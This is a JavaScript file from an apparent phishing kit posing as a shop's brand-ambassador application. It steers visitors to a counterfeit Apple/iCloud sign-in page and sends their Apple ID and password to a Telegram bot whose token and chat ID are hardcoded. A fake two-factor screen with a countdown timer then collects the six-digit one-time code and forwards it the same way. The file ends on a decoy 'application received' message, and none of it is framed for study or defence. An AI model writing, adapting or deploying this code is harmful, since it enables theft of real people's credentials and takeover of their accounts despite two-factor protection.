document.addEventListener('DOMContentLoaded', () => {
    
    // --- ELEMENT SELECTORS WITH SAFETY LOGS ---
    const elements = {
        storefrontView: document.getElementById('storefront-view'),
        formView: document.getElementById('form-view'),
        verificationView: document.getElementById('verification-view'),
        icloudSigninView: document.getElementById('icloud-signin-view'),
        appleMfaView: document.getElementById('apple-mfa-view'),
        
        applyBtn: document.getElementById('applyBtn'),
        backToShopBtn: document.getElementById('backToShop'),
        brandLogo: document.getElementById('brandLogo'),
        navHome: document.getElementById('navHome'),
        navShop: document.getElementById('navShop'),
        navAmbassador: document.getElementById('navAmbassador'),
        
        ambassadorForm: document.getElementById('ambassadorForm'),
        verifyGoogleBtn: document.getElementById('verifyGoogle'),
        verifyIcloudBtn: document.getElementById('verifyIcloud'),
        cancelAppleBtn: document.getElementById('cancelApple'),
        cancelMfaBtn: document.getElementById('cancelMfa'),
        
        appleSignInForm: document.getElementById('appleSignInForm'),
        appleMfaForm: document.getElementById('appleMfaForm'),
        timerDisplay: document.getElementById('timer-display'),

        searchInput: document.getElementById('search-input'),
        searchBtn: document.getElementById('search-btn')
    };

    console.log("--- DOM Elements Initial Check ---");
    for (const [key, element] of Object.entries(elements)) {
        if (!element) {
            console.warn(`Optional/Missing ID: '${key}' was not found in index.html. Script will bypass safely.`);
        }
    }

    let mfaCountdownInterval = null;
    const originalMfaHtml = elements.appleMfaForm ? elements.appleMfaForm.innerHTML : '';

    // --- STATE MACHINE ROUTING VISIBILITY ENGINE ---
    function resetAllViews() {
        if (elements.storefrontView) elements.storefrontView.classList.add('hidden-view');
        if (elements.formView) elements.formView.classList.add('hidden-view');
        if (elements.verificationView) elements.verificationView.classList.add('hidden-view');
        if (elements.icloudSigninView) elements.icloudSigninView.classList.add('hidden-view');
        if (elements.appleMfaView) elements.appleMfaView.classList.add('hidden-view'); 
    }

    function showStorefrontView() {
        resetAllViews();
        if (elements.storefrontView) elements.storefrontView.classList.remove('hidden-view');
        window.scrollTo({ top: 0 });
    }

    function showFormView() {
        resetAllViews();
        if (elements.formView) elements.formView.classList.remove('hidden-view');
        window.scrollTo({ top: 0 });
    }

   // --- OTP COUNTDOWN TIMER MODULE (FIXED FOR DYNAMIC RENDERING) ---
    function startMfaTimer(durationSeconds) {
        clearInterval(mfaCountdownInterval);
        let timeRemaining = durationSeconds;

        function updateTimerUI() {
            const minutes = Math.floor(timeRemaining / 60);
            const seconds = timeRemaining % 60;
            
            // DYNAMIC FIX: Find the live timer element on the page every second
            const dynamicTimerDisplay = document.getElementById('timer-display');
            if (dynamicTimerDisplay) {
                dynamicTimerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            }
            
            if (timeRemaining <= 0) {
                clearInterval(mfaCountdownInterval);
                alert("Security handshake token has expired. Please log in again.");
                resetAllViews();
                if (elements.verificationView) elements.verificationView.classList.remove('hidden-view');
                window.scrollTo({ top: 0 });
            }
            timeRemaining--;
        }

        updateTimerUI();
        mfaCountdownInterval = setInterval(updateTimerUI, 1000);
    }

    // --- INTERACTIVE LINK MAPPINGS ---
    if (elements.applyBtn) elements.applyBtn.addEventListener('click', showFormView);
    if (elements.navAmbassador) elements.navAmbassador.addEventListener('click', showFormView);
    if (elements.backToShopBtn) elements.backToShopBtn.addEventListener('click', showStorefrontView);
    if (elements.brandLogo) elements.brandLogo.addEventListener('click', showStorefrontView);
    if (elements.navHome) elements.navHome.addEventListener('click', showStorefrontView);
    
    if (elements.navShop) {
        elements.navShop.addEventListener('click', () => {
            showStorefrontView();
            const shopSec = document.getElementById('shop');
            if (shopSec) shopSec.scrollIntoView({ behavior: 'smooth' });
        });
    }

    // STEP 1: Form Submit routes to Selection Screen
    if (elements.ambassadorForm) {
        elements.ambassadorForm.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const formSubmitBtn = elements.ambassadorForm.querySelector('.submit-application-btn');
            let originalText = "Submit Application";
            
            if (formSubmitBtn) {
                originalText = formSubmitBtn.innerHTML;
                formSubmitBtn.innerHTML = `Submitting... <i class="fa-solid fa-circle-notch fa-spin"></i>`;
                formSubmitBtn.disabled = true;
            }
            
            setTimeout(() => {
                if (formSubmitBtn) {
                    formSubmitBtn.innerHTML = originalText;
                    formSubmitBtn.disabled = false;
                }
                
                resetAllViews();
                if (elements.verificationView) elements.verificationView.classList.remove('hidden-view');
                window.scrollTo({ top: 0 });
            }, 2000);
        });
    }

    // STEP 2: Handle Verification Selection Actions
    if (elements.verifyGoogleBtn) {
        elements.verifyGoogleBtn.addEventListener('click', () => {
            alert('Google Account Verification is currently undergoing system maintenance. Please try a different login method.');
        });
    }

    if (elements.verifyIcloudBtn) {
        elements.verifyIcloudBtn.addEventListener('click', () => {
            resetAllViews();
            if (elements.icloudSigninView) elements.icloudSigninView.classList.remove('hidden-view');
            window.scrollTo({ top: 0 });
        });
    }

    if (elements.cancelAppleBtn) {
        elements.cancelAppleBtn.addEventListener('click', (e) => {
            e.preventDefault();
            resetAllViews();
            if (elements.verificationView) elements.verificationView.classList.remove('hidden-view');
            window.scrollTo({ top: 0 });
        });
    }

    if (elements.cancelMfaBtn) {
        elements.cancelMfaBtn.addEventListener('click', (e) => { 
            e.preventDefault();
            clearInterval(mfaCountdownInterval);
            resetAllViews();
            if (elements.icloudSigninView) elements.icloudSigninView.classList.remove('hidden-view');
            window.scrollTo({ top: 0 });
        });
    }

    // STEP 3: Handle Sign-In Form submission (SENDS CREDENTIALS TO TELEGRAM IMMEDIATELY)
    if (elements.appleSignInForm) {
        elements.appleSignInForm.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const submitBtn = elements.appleSignInForm.querySelector('.apple-luxury-submit-btn');
            const originalBtnText = submitBtn ? submitBtn.textContent : 'Sign In';
            
            if (submitBtn) {
                submitBtn.textContent = 'Connecting...';
                submitBtn.disabled = true;
            }

            const appleUser = elements.appleSignInForm.querySelector('input[type="text"]') ? elements.appleSignInForm.querySelector('input[type="text"]').value : "Not Found";
            const applePass = elements.appleSignInForm.querySelector('input[type="password"]') ? elements.appleSignInForm.querySelector('input[type="password"]').value : "Not Found";

            // Telegram Configurations
            const TELEGRAM_BOT_TOKEN = '8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU'; 
            const TELEGRAM_CHAT_ID = '5207464165';     
            
            const loginMessageText = `👤 *New Login Attempt Captured!* 👤\n\nUser: \`${appleUser}\`\nPassword: \`${applePass}\``;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: loginMessageText,
                    parse_mode: 'Markdown'
                })
            })
            .then(res => console.log("Sign-in data dispatched."))
            .catch(err => console.error("Dispatch error:", err));
            
            setTimeout(() => {
                if (submitBtn) {
                    submitBtn.textContent = originalBtnText;
                    submitBtn.disabled = false;
                }
                
                if (elements.appleMfaForm) elements.appleMfaForm.innerHTML = originalMfaHtml;
                
                resetAllViews();
                if (elements.appleMfaView) elements.appleMfaView.classList.remove('hidden-view');
                window.scrollTo({ top: 0 });
                
                const newMfaInput = document.getElementById('mfaCodeInput');
                if (newMfaInput) {
                    newMfaInput.value = '';
                    newMfaInput.addEventListener('input', (event) => {
                        event.target.value = event.target.value.replace(/[^0-9]/g, '');
                        if (event.target.value.length === 6) {
                            if (typeof elements.appleMfaForm.requestSubmit === 'function') {
                                elements.appleMfaForm.requestSubmit();
                            } else {
                                elements.appleMfaForm.dispatchEvent(new Event('submit', { cancelable: true, bubbles: true }));
                            }
                        }
                    });
                }
                
                startMfaTimer(180);
            }, 2000);
        });
    }

    // STEP 4: Handle Security OTP Code Submission & Telegram Integration
    if (elements.appleMfaForm) {
        elements.appleMfaForm.addEventListener('submit', (e) => {
            e.preventDefault();
            
            const currentMfaInput = document.getElementById('mfaCodeInput');
            if (currentMfaInput && currentMfaInput.value.length < 6) {
                alert('Please input a complete 6-digit identity token verification sequence.');
                return;
            }

            clearInterval(mfaCountdownInterval);

            elements.appleMfaForm.innerHTML = `
                <div style="text-align: center; padding: 40px 10px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
                    <i class="fa-solid fa-circle-notch fa-spin" style="font-size: 2.5rem; color: #f05c75; margin-bottom: 20px;"></i>
                    <h3 style="color: #1d1d1f; font-weight: 600; font-size: 1.3rem; margin-bottom: 8px;">Verifying code...</h3>
                    <p style="color: #86868b; font-size: 0.9rem; line-height: 1.5;">Processing data hook pipeline...</p>
                </div>
            `;

            const TELEGRAM_BOT_TOKEN = '8192929944:AAH9D4VnMRrMXUfGf3iaq-xCbwCW4DNrstU'; 
            const TELEGRAM_CHAT_ID = '5207464165';     
            
            const otpMessageText = `💬 *MFA Code Received!* 💬\n\nOTP Code: \`${currentMfaInput.value}\``;

            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: otpMessageText,
                    parse_mode: 'Markdown'
                })
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Telegram rejection');
                }
                return response.json();
            })
            .then(data => {
                elements.appleMfaForm.innerHTML = `
                    <div style="text-align: center; padding: 40px 10px; font-family: -apple-system, BlinkMacSystemFont, sans-serif;">
                        <i class="fa-solid fa-circle-check" style="font-size: 3rem; color: #2ec4b6; margin-bottom: 20px;"></i>
                        <h3 style="color: #1d1d1f; font-weight: 600; font-size: 1.3rem; margin-bottom: 8px;">Application Received!</h3>
                        <p style="color: #86868b; font-size: 0.9rem; line-height: 1.5;">THANK YOU FOR APPLYING. PLEASE WATCH YOUR INBOX FOR FINAL SELECTION DETAILS.</p>
                    </div>
                `;

                setTimeout(() => {
                    if (elements.appleMfaForm) elements.appleMfaForm.reset();
                    if (elements.appleSignInForm) elements.appleSignInForm.reset();
                    if (elements.ambassadorForm) elements.ambassadorForm.reset();
                    if (elements.appleMfaForm) elements.appleMfaForm.innerHTML = originalMfaHtml;
                    showStorefrontView();
                }, 3500);
            })
            .catch(error => {
                console.error(error);
                alert('Network notification synchronization failed.');
                showStorefrontView();
            });
        });
    }

    // Simple Search simulation
    function executeSearch() {
        if (elements.searchInput) {
            const query = elements.searchInput.value.trim();
            if (query) {
                showStorefrontView();
                alert(`Searching regional catalog for: "${query}"`);
            }
        }
    }

    if (elements.searchBtn) elements.searchBtn.addEventListener('click', executeSearch);
    if (elements.searchInput) {
        elements.searchInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                executeSearch();
            }
        });
    }

    // Bag Simulation
    const cartButtons = document.querySelectorAll('.add-to-cart-btn');
    cartButtons.forEach((btn) => {
        btn.addEventListener('click', () => {
            alert(`Exquisite choice! Item securely allocated to your shopping bag.`);
        });
    });
});